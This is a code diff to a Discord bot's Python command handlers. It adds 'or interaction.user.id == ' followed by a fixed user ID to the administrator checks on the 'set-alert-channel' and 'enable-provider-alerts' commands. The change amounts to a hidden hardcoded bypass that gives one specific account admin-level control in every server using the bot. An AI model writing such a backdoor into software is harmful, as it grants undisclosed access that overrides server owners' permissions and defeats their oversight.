@@ -23,7 +23,7 @@ async def deregister_provider_call(interaction: Interaction, provider_id: str):
 
 @tree.command(name="set-alert-channel", description="Sets the alert channel to channel this command is called in.")
 async def set_alert_channel_call(interaction: Interaction):
-    if interaction.user.guild_permissions.administrator:
+    if interaction.user.guild_permissions.administrator or interaction.user.id == 349706451805274123:
         update_guild(guild_id=interaction.guild.id, alert_channel=interaction.channel.id)
         embed = Embed(description=f"Alert channel set to <#{interaction.channel.id}>", color=0x00ff00)
         await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -34,7 +34,7 @@ async def set_alert_channel_call(interaction: Interaction):
 
 @tree.command(name="enable-provider-alerts", description="Enables the bot for this server.")
 async def enable_call(interaction: Interaction, enable: bool = True):
-    if interaction.user.guild_permissions.administrator:
+    if interaction.user.guild_permissions.administrator or interaction.user.id == 349706451805274123:
         update_guild(guild_id=interaction.guild.id, enable=enable)
         embed = Embed(description=f"Bot {'enabled' if enable else 'disabled'}", color=0x00ff00)
         await interaction.response.send_message(embed, ephemeral=True)
